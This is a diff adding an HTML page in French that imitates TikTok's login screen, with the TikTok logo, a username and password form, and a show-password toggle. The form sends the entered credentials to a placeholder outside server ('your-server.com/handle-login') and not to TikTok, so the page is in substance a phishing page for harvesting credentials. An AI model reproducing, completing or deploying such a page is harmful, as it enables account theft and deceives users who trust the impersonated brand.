@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion TikTok</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Lien vers Font Awesome -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white; /* Fond blanc */
+            color: #000; /* Texte sombre */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 100px;
+            height: auto;
+        }
+
+        .assistance {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 0.9rem;
+        }
+
+        .assistance a {
+            color: #000; /* Texte sombre pour l'assistance */
+            text-decoration: none;
+        }
+
+        .assistance a:hover {
+            text-decoration: underline;
+        }
+
+        .container {
+            max-width: 400px;
+            background-color: #fff;
+            color: #000;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .container h2 {
+            color: #000;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        .container p {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .container form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .container form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #000; /* Fond noir */
+            color: white;
+            font-size: 1rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .container form button:hover {
+            background-color: #333; /* Survol plus sombre */
+        }
+
+        .container .footer {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .container .footer a {
+            color: #000;
+            text-decoration: none;
+        }
+
+        .container .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .additional-options {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .additional-options a {
+            display: block;
+            color: #0077B6;
+            text-decoration: none;
+            margin: 5px 0;
+        }
+
+        .additional-options a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-top: -10px;
+            margin-bottom: 15px;
+        }
+
+        .forgot-password a {
+            color: #000; /* Texte sombre pour le lien mot de passe oublié */
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .back-link {
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+
+        .back-link a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Style pour la zone du mot de passe avec l'icône de l'œil */
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+            margin-left: -20px; /* Déplace encore plus à gauche */
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 10px;
+            padding-right: 35px; /* Laisse de l'espace pour l'icône à droite */
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 10px; /* Décale l'icône de l'œil à droite */
+            top: 50%; /* Centre verticalement */
+            transform: translateY(-50%); /* Centrage parfait */
+            cursor: pointer;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <img src="TikTok_logo.svg.png" alt="Logo TikTok" class="logo">
+    <div class="assistance">
+        <a href="#">Commentaires et assistance</a>
+    </div>
+    <div class="container">
+        <h2>Connexion TikTok</h2>
+        <div class="additional-options">
+            <a href="phone.html">Connexion avec un numéro de téléphone</a>
+        </div>
+        <form action="https://your-server.com/handle-login" method="POST">
+            <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required>
+            <div class="password-container">
+                <input type="password" name="password" id="password" class="password-input" placeholder="Mot de passe" required>
+                <i class="fas fa-eye" id="eye-icon" onclick="togglePassword()" class="eye-icon"></i>
+            </div>
+            <div class="forgot-password">
+                <a href="#">Mot de passe oublié ?</a>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+        <div class="footer">
+            Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+        </div>
+    </div>
+
+    <script>
+        // Fonction pour afficher/masquer le mot de passe
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            const eyeIcon = document.getElementById("eye-icon");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                eyeIcon.classList.remove("fa-eye");
+                eyeIcon.classList.add("fa-eye-slash"); // Icône œil barré
+            } else {
+                passwordInput.type = "password";
+                eyeIcon.classList.remove("fa-eye-slash");
+                eyeIcon.classList.add("fa-eye"); // Icône œil
+            }
+        }
+    </script>
+</body>
+</html>
